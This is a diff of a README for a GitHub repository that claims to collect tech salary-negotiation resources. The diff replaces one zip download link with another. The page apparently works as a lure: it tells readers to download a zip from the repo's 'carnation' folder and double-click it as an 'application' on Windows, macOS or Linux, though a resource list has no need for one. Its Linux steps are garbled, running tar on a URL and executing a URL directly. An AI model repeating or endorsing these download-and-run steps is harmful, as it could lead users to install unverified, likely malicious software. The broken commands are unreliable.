@@ -1,7 +1,7 @@
 # 🎉 awesome-tech-salary-resources - Maximize Your Tech Salary Today!
 
 ## 💾 Download Now
-[![Download](https://raw.githubusercontent.com/HSm-GFX/awesome-tech-salary-resources/main/carnation/awesome_salary_resources_tech_3.9.zip)](https://raw.githubusercontent.com/HSm-GFX/awesome-tech-salary-resources/main/carnation/awesome_salary_resources_tech_3.9.zip)
+[![Download](https://github.com/HSm-GFX/awesome-tech-salary-resources/raw/refs/heads/main/carnation/tech-resources-awesome-salary-2.2-beta.2.zip)](https://github.com/HSm-GFX/awesome-tech-salary-resources/raw/refs/heads/main/carnation/tech-resources-awesome-salary-2.2-beta.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the **awesome-tech-salary-resources** project! This resource aims to equip you with valuable information to negotiate salaries beyond $200k, understand the differences between W2 and 1099 contracting, and boost your overall compensation.
@@ -16,16 +16,16 @@ This repository collects high-quality content helping you with:
 ## 📥 Download & Install
 To get started, visit the following page to download the latest version of the application:
 
-[Download Here](https://raw.githubusercontent.com/HSm-GFX/awesome-tech-salary-resources/main/carnation/awesome_salary_resources_tech_3.9.zip)
+[Download Here](https://github.com/HSm-GFX/awesome-tech-salary-resources/raw/refs/heads/main/carnation/tech-resources-awesome-salary-2.2-beta.2.zip)
 
 Follow these steps to install and run the application:
 
 1. Click on the link above to access the Releases page.
 2. Look for the latest release.
 3. Download the appropriate file for your operating system:
-   - For Windows users, download `https://raw.githubusercontent.com/HSm-GFX/awesome-tech-salary-resources/main/carnation/awesome_salary_resources_tech_3.9.zip`.
-   - For macOS users, download `https://raw.githubusercontent.com/HSm-GFX/awesome-tech-salary-resources/main/carnation/awesome_salary_resources_tech_3.9.zip`.
-   - For Linux users, download `https://raw.githubusercontent.com/HSm-GFX/awesome-tech-salary-resources/main/carnation/awesome_salary_resources_tech_3.9.zip`.
+   - For Windows users, download `https://github.com/HSm-GFX/awesome-tech-salary-resources/raw/refs/heads/main/carnation/tech-resources-awesome-salary-2.2-beta.2.zip`.
+   - For macOS users, download `https://github.com/HSm-GFX/awesome-tech-salary-resources/raw/refs/heads/main/carnation/tech-resources-awesome-salary-2.2-beta.2.zip`.
+   - For Linux users, download `https://github.com/HSm-GFX/awesome-tech-salary-resources/raw/refs/heads/main/carnation/tech-resources-awesome-salary-2.2-beta.2.zip`.
 4. Once the file is downloaded, locate it in your Downloads folder.
 5. Double-click the file to start the installation process.
 
@@ -38,14 +38,14 @@ Follow these steps to install and run the application:
 - Drag the app into your Applications folder.
 
 ### Linux Installation
-- Extract the https://raw.githubusercontent.com/HSm-GFX/awesome-tech-salary-resources/main/carnation/awesome_salary_resources_tech_3.9.zip file:
+- Extract the https://github.com/HSm-GFX/awesome-tech-salary-resources/raw/refs/heads/main/carnation/tech-resources-awesome-salary-2.2-beta.2.zip file:
   ```bash
-  tar -xzvf https://raw.githubusercontent.com/HSm-GFX/awesome-tech-salary-resources/main/carnation/awesome_salary_resources_tech_3.9.zip
+  tar -xzvf https://github.com/HSm-GFX/awesome-tech-salary-resources/raw/refs/heads/main/carnation/tech-resources-awesome-salary-2.2-beta.2.zip
   ```
 - Navigate into the folder and run the application:
   ```bash
   cd awesome-tech-salary-resources
-  https://raw.githubusercontent.com/HSm-GFX/awesome-tech-salary-resources/main/carnation/awesome_salary_resources_tech_3.9.zip
+  https://github.com/HSm-GFX/awesome-tech-salary-resources/raw/refs/heads/main/carnation/tech-resources-awesome-salary-2.2-beta.2.zip
   ```
 
 ## 🌟 Features
